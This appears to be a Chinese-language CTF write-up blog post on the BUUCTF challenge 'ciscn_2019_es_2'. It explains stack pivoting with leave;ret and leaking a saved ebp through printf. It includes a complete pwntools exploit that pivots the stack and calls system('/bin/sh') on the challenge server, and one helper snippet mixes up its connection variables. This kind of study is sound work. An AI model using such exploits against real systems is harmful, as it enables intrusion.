+++
title = "wp"
date = "2026-03-23"
type = "post"
categories = ['BUU']
tags = ['第一页', 'ciscn_2019_es_2(栈迁移)']
draft = false
+++
这类题目的特征是Pasted image 20260110090436.png
我们只能输入0x30,而栈溢出所需要的是0x28+4+4=0x30
我们要将栈空间迁移到一个足够大的空间去构造rop

### 栈迁移使用leave_ret

leave指令一共执行2个步骤
首先: mov esp ebp 将ebp指向的地址给esp，也就是消除栈空间
然后: pop ebp 将esp指向地址存放的值赋值给ebp，所以ebp就会跑到新的地址，同时此时esp继续+4

ret指令执行1个步骤

ret执行pop eip 将esp指向的地址存放的值给eip esp继续+4

这样之后，就会将ebp和esp的地址全部修改，从而到达一个新的栈中。

### 如何找到ebp的地址
这里可以看到，栈空间是0x28，可以读的是30，所以当读到0x28的时候，+0x4正好覆盖ebp，所以偏移量就是0x2c，又因为有prinf函数，后面直接打印出来地址，因为%s碰到\x00会截断，如果没有\x00就会连着打印后面的内容，所以我们将s填满之后不用\x00结尾，就会将地址全部输出，然后找到ebp的地址即可！

```python
payload = b'a' * 0x27 + b'b'*4
print('开始发送数据')
name1="Welcome, my friend. What's your name?\n"
io.sendafter(name1,payload)
print("开始准备接收数据:")
io.recvuntil('bbbb')
ebp = u32(io.recv(4))
print('ebd的地址为:{}'.format(hex(ebp)))
io.interactive()
```
这样子就可以接收到ebp的值
或者也可以用下面的来接收，有一定区别，不知道为什么
```python
payload = b'a' * 0x27 + b'b'
io.recvuntil(b'Welcome, my friend. What\'s your name?\n')
io.send(payload)
io.recvuntil(b"b")
ebp = u32(p.recv(4))
print(hex(ebp))
```
[https://blog.csdn.net/rjc20051110/article/details/147026573]()这个wp写的还不错
最后的exp（这里可以这么写是因为他两次用了同一个栈）
```python
from pwn import *
from LibcSearcher import *
 
p = remote("node5.buuoj.cn", 26021)
elf = ELF("./ciscn_2019_es_2")
 
payload = b'a' * 0x27 + b'b'
 
sys_addr = 0x08048400
leave_ret_addr = 0x08048562
 
p.recvuntil(b'Welcome, my friend. What\'s your name?\n')
p.send(payload)
p.recvuntil(b"b")
ebp = u32(p.recv(4))
print(hex(ebp))
payload = b"a" * 4 + p32(sys_addr) + p32(0) + p32(ebp-0x28) + b'/bin/sh'
payload = payload.ljust(0x28, b'\x00')
payload += p32(ebp-0x38) + p32(leave_ret_addr)
p.send(payload)
p.interactive()
```
